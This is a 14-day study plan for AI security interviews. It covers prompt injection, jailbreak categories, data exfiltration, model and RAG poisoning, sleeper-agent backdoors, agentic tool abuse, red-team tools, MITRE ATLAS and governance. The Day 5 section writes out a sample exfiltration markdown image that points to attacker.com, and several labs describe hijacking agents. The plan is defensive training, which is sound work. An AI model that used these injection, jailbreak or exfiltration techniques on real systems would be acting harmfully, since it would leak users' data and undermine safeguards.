# LLM / AI Security 14-Day Intensive

Target roles: Dropzone AI Senior Security Engineer, Resilience N8N Engineer, OneDigital AI Security Engineer.
Goal: speak fluently to a senior interviewer about LLM threat models, OWASP LLM Top 10, MITRE ATLAS, real incidents, and concrete defenses anchored in the CoreDirective stack (OpenClaw v2026.3.8, n8n SOAR, Ollama, Vault, Keycloak, 37-doc GRC corpus).

Time per day: 60 to 90 minutes. Every day ends with a runnable lab in `labs/`.

## Day 1 — OWASP LLM Top 10 v2 baseline (60 min)

Read the OWASP GenAI Security Project list end to end: [genai.owasp.org](https://genai.owasp.org/). Lock the names cold:

1. LLM01 Prompt Injection
2. LLM02 Sensitive Information Disclosure
3. LLM03 Supply Chain
4. LLM04 Data and Model Poisoning
5. LLM05 Improper Output Handling
6. LLM06 Excessive Agency
7. LLM07 System Prompt Leakage
8. LLM08 Vector and Embedding Weaknesses
9. LLM09 Misinformation
10. LLM10 Unbounded Consumption

Lab: `labs/prompt_injection_basic.py`. Watch a vulnerable agent leak the system prompt via a planted instruction in a doc, then add the Anthropic XML role-separation pattern and watch it hold.

## Day 2 — Direct prompt injection deep dive (75 min)

Read Simon Willison on prompt injection (simonwillison.net), the Anthropic prompt engineering guide on role separation, and the original Riley Goodside thread.

Map: payload, transport, target, effect. Walk through the Bing Sydney leak (Kevin Liu, Feb 2023) and the original DAN jailbreak. Hands-on: use the lab from Day 1, swap payloads (translate, ignore, override, persona swap, encoding bypass with base64).

## Day 3 — Indirect prompt injection (90 min)

This is the one you must own cold. Indirect injection lives in fetched content: webpages, PDFs, emails, RAG chunks. Greshake et al 2023 ("Not what you've signed up for") is the canonical paper.

Lab: `labs/indirect_injection_via_tool.py`. Agent fetches a webpage that contains a hidden instruction. Defense: tag every external input as untrusted with XML, validate output before tool calls fire.

Real incident: ChatGPT plugin SSRF and the Bing Chat data exfil via injected webpage (Greshake demo, March 2023).

## Day 4 — Jailbreaks and bypasses (60 min)

Categories: persona (DAN, AIM), multi-turn ramp, encoding (base64, ROT13, leetspeak), low-resource language, payload splitting, many-shot jailbreaking (Anthropic, April 2024).

Lab: `labs/jailbreak_detection.py`. Build a small classifier that flags suspicious prompts before they hit the model. Compare to Lakera Guard's approach.

## Day 5 — Data exfiltration through LLMs (75 min)

Two killer techniques:

1. Markdown image rendering — model emits `![x](https://attacker.com/?data=...)` and the client renders the image, leaking data. ChatGPT shipped a partial fix in 2024 with `url_safe`.
2. Tool-call exfil — agent has an HTTP tool, attacker prompts it to POST secrets to attacker domain.

Lab: `labs/data_exfil_via_markdown_image.py`. Show the leak, then strip markdown images server-side and add a domain allowlist.

## Day 6 — Supply chain and model poisoning (75 min)

Read PoisonGPT (Mithril Security, July 2023) — they uploaded a lobotomized GPT-J to Hugging Face that lied about specific facts. Then Anthropic's "Sleeper Agents" paper (Hubinger et al, 2024) on backdoors that survive safety training.

Concepts: typosquatted models, malicious `pickle` payloads in `.bin` checkpoints, embedding-based backdoors (BadNets-style triggers), data poisoning at pretraining (Carlini et al, "Poisoning Web-Scale Training Datasets").

LangChain RCE chain (CVE-2023-29374) — the `LLMMathChain` `eval()` sink. Read the CVE, understand why prompt to code to `eval` is the canonical chain.

## Day 7 — Agentic system risk (90 min)

The Dropzone AI use case lives here. Agents have tools. Tools have side effects. Prompt injection becomes RCE.

Threats: tool abuse, lateral movement via OAuth tokens the agent holds, recursive injection (output of tool A becomes input that hijacks call to tool B), confused deputy (agent runs with elevated rights on user's behalf).

Lab: `labs/agentic_tool_abuse.py`. LangGraph-style agent has `delete_user`, `read_user`, `send_email`. Inject a request that hijacks `delete_user`. Defense: tool allowlist by user role, human-in-the-loop on destructive actions, output schema validation.

## Day 8 — RAG security (75 min)

Knowledge base poisoning: attacker plants a document in the corpus that hijacks any retrieval that hits it. PoisonedRAG paper (Zou et al, 2024) demonstrated this on real systems with 5 poisoned docs in 1M.

Retrieval manipulation: embedding collisions, query rewriting attacks. Provenance: every chunk needs a source tag and a trust score.

Lab: `labs/rag_poisoning_demo.py`. Plant a malicious chunk in the corpus, watch the agent obey. Defense: provenance tags, source allowlists, retrieval auditing.

## Day 9 — Evaluation and red-teaming tools (90 min)

Three tools to know cold:

1. **Garak** (NVIDIA) — `pip install garak`. Probes for jailbreaks, prompt injection, encoding bypasses, toxicity. Like nmap for LLMs.
2. **Promptfoo** — eval framework with red team mode. YAML-driven, CI-friendly.
3. **NeMo Guardrails** (NVIDIA) — runtime guardrails via Colang. Blocks topics, validates outputs, flow control.

Also: Lakera Guard (commercial, prompt injection classifier API), Robust Intelligence (model risk platform), Microsoft PyRIT (red team automation).

Lab: `labs/promptfoo_redteam.yaml` and `labs/guardrails_with_nemo.py`. Run a real red team config against an Anthropic endpoint.

## Day 10 — MITRE ATLAS (60 min)

ATLAS is ATT&CK for ML. Read [atlas.mitre.org](https://atlas.mitre.org). Memorize the tactics:

- Reconnaissance, Resource Development, Initial Access, ML Model Access, Execution, Persistence, Defense Evasion, Discovery, Collection, ML Attack Staging, Exfiltration, Impact.

Top techniques to know by ID:

- AML.T0051 LLM Prompt Injection
- AML.T0054 LLM Jailbreak
- AML.T0057 LLM Data Leakage
- AML.T0048 External Harms
- AML.T0049 Exploit Public-Facing Application
- AML.T0024 Exfiltration via ML Inference API
- AML.T0010 ML Supply Chain Compromise
- AML.T0020 Poison Training Data

Lab: `labs/mitre_atlas_mapper.py`. Take a finding string, return the ATLAS technique IDs.

## Day 11 — Detection and logging for LLM agents (75 min)

What do you log? Every prompt, every tool call, every retrieval hit, every output. With provenance. Hash the user prompt for privacy, store full prompt only on alerts.

Detections to build:

- Sudden token burn (cost anomaly) → LLM10 Unbounded Consumption.
- High refusal rate → red team in progress.
- New tool-call patterns → injection or jailbreak success.
- Output contains URLs to non-allowlisted domains → exfil attempt.

Lab: `labs/llm_log_triage_agent.py`. Agent reads a log line, decides if a prompt injection happened, returns ATLAS IDs and a confidence score. This is the Dropzone AI demo.

## Day 12 — Governance: NIST AI RMF and ISO 42001 (60 min)

NIST AI RMF (AI 100-1, January 2023) four functions: Govern, Map, Measure, Manage. Read the Generative AI Profile (NIST AI 600-1, July 2024) — that's the LLM-specific layer.

ISO/IEC 42001:2023 — the AI management system standard. AIMS, like ISMS for AI. Annex A controls.

EU AI Act risk tiers: prohibited, high-risk, limited-risk, minimal. Know which tier a SOC triage agent falls into (limited-risk most likely, but high-risk if it makes employment or law-enforcement decisions).

Anthropic's Responsible Scaling Policy and OpenAI's Preparedness Framework — read summaries.

## Day 13 — Stack-specific threat models (90 min)

Walk through `THREAT-MODELS.md` end to end. Each of the four systems is interview ammo:

1. Customer-facing chatbot with RAG.
2. Internal SOC triage agent (Dropzone AI shape).
3. Code-generation copilot.
4. Multi-agent SOAR orchestrator (your n8n + OpenClaw stack).

For each one, be able to draw the trust boundaries on a whiteboard and name two STRIDE threats per asset, with OWASP LLM and ATLAS IDs.

## Day 14 — Storytelling and mock interview (90 min)

Run through `STORYTELLING.md` out loud. Each story 90 to 120 seconds, no notes. Then run a mock interview with the 35 questions in `INTERVIEW-Qs.md`. Record yourself. The bar is calm, specific, anchored in real components from your stack.

End-of-program proof: a public writeup or blog post on one of: (a) prompt injection defenses you shipped on OpenClaw, (b) RAG provenance for the GRC corpus, (c) n8n agent allowlist pattern. That post is your differentiator at $200K.
